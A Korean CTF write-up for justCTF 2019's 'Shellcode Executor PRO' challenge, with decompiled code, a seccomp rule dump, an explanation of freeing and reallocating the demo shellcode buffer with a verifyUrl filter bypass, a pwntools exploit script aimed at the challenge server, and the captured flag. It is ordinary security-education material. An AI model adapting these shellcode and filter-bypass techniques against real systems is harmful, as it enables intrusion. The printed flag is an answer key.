---
title: "2019 just CTF Shellcode Executor PRO"
date: 2020-1-15
tags: [just]
categories: [just]
---



1번 메뉴

입력받은 걸 `verifyUrl` 함수에서 xor 1한 값이 9보다 작아야한다. 안 그러면 exit해준다.

```c
int downloadShellcode()
{
  char *s; // ST18_8

  s = malloc(0x400uLL);
  printf("Enter url: ");
  fgets(s, 1024, stdin);
  if ( verifyUrl(s) ^ 1 )
  {
    puts("Your url contains incorrect characters, this incident will be reported");
    exit(-1);
  }
  return puts("For this feature you need to purchase the full version of our product");
}
```

2번 메뉴

`demo_shellcode` 라는 영역을 free해줄 수 있다.

```c
void __fastcall deleteShellcode(__int64 a1)
{
  if ( *a1 )
  {
    puts("This shellcode has already been deleted");
  }
  else
  {
    *a1 = 1;
    free(*(a1 + 8));
    free(*(a1 + 16));
  }
}
```

3번 메뉴

쉘코드를 `restrictAccess` 함수 bypass하면 실행해준다.

```c
int __fastcall executeShellcode(__int64 a1)
{
  void *dest; // [rsp+18h] [rbp-8h]

  printf("Executing shellcode from %s\n", *(a1 + 8));
  dest = mmap(0LL, 0x400uLL, 7, 34, -1, 0LL);
  memcpy(dest, *(a1 + 16), 0x400uLL);
  if ( restricted != 1 )
    restrictAccess();
  puts("====================================");
  (dest)("====================================");
  puts("====================================");
  return munmap(dest, 0x400uLL);
}
```

`restrictAccess` 함수를 보면 seccomp가 걸려있는데 read, write, mmap, munmap .. 등등만 허용해놨다.

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0012
 0008: 0x15 0x03 0x00 0x0000000b  if (A == munmap) goto 0012
 0009: 0x15 0x02 0x00 0x0000000f  if (A == rt_sigreturn) goto 0012
 0010: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0012
 0011: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

`demo_shellcode` 라는 영역을 3번 메뉴에서 실행시켜주기 때문에 이곳에 쉘코드를 넣어주면 된다. 근데 밑에 `The flag will be here` 이라는 문구가 있다. 여기에 플래그가 있어서 읽어오면 될거다. 

![](https://user-images.githubusercontent.com/32904385/72424712-c3229880-37c9-11ea-9ce9-5d58e2ef305a.png)

익스는 write로 flag 영역을 긁어오면 된다. 근데 우선 `verifyUrl` 함수를 우회해줘야하는데 `\x00` 을 넣어서 우회하려고 했는데 쉘코드가 실행이 안된다.그래서 `xor al,0 ` 으로 우회해주면 된다.

익스 순서는 `demo_shellcode` 영역을 free해주고 `downloadShellcode` 함수에서 `write(1,rip+0x70,0xff)` 해준 후에 입력해주면 된다. `rip+0x70`은 flag위치다. 

마지막으로 `executeShellcode` 함수 실행해주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./shellcodeexecutor')
#p = process('./shellcodeexecutor')
p = remote('46.101.173.184', 1446)

payload = '''
xor al, 0
mov rdi, 1
lea rsi, [rip+0x70]
mov rdx, 0xff
mov rax, 1
syscall
'''

p.sendlineafter('>','2') # Delete shellcode -> Demo Free
p.sendlineafter('>','1') # Download shellcode from url -> allocate
p.sendlineafter(':',asm(payload)) # verifyUrl bypass
p.sendlineafter('>','3') # executeShellcode -> seccomp bypass

p.interactive()
```

**FLAG : `justCTF{f0r_4_b3tt3r_fl4g_purch4s3_th3_full_v3rsi0n_0f_0ur_pr0duct}`**